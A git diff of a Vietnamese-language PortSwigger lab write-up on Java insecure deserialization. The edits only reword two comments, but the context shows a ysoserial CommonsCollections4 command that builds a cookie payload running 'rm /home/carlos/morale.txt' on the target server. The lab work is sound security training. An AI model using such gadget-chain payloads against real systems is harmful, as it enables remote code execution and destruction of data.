@@ -19,7 +19,7 @@ Chúng ta cần sử dụng tool của bên thứ 3 .Và công cụ phổ biến
 ```
 java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > cookie.txt
 
-// Chỉ gói 4 mới hoạt độngh đúng gói của nó sâu khi sử dụng các gói khác
+// Chỉ gói 4 mới hoạt độngh đúng payload của nó sâu khi sử dụng các gói khác
 // -w 0 đảm bảo rằng chuỗi base64 được xuất ra trên một dòng duy nhất, không có ngắt dòng
 ```
 
@@ -27,7 +27,7 @@ Thay value apply lại web, và nó xuất hiện lỗi này:
 
 ![image](https://github.com/vanniichan/Portswigger/assets/112863484/3988bea9-137e-4140-87cf-c66e78df27a9)
 
-Lý do là vì có các byte chưa được xử lí đúng và encode URL:
+Lý do là vì có các byte chưa được xử lí đúng, đúng payload và encode URL:
 
 ![image](https://github.com/vanniichan/Portswigger/assets/112863484/c3ea67f8-7ca4-4fa6-8bbf-209fd74aff58)
 
